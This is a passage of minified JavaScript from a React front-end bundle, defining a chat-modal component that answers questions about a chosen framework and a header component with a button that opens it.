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"}